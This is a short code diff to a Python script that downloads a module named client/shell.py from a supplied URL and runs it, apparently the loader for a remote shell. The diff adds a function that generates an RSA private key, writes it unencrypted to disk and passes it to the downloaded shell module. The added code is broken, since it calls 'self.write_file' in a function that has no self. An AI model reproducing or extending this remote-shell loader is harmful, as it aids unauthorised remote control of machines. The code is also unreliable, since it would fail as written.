@@ -4,6 +4,25 @@ import os
 import subprocess
 import ssl
 import sys
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+
+def receive_private_key():
+    private_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048
+    )
+    private_pem = private_key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+    self.write_file("private_key.pem", private_pem)
+    return private_key
 
 # check to see if the scirpt is already Rolling
 def create_moduel(url):
@@ -34,4 +53,4 @@ def run(url, file_path):
 
     module = create_moduel(f"{url}client/shell.py")
 
-    module.run(data)
+    module.run(data, receive_private_key())
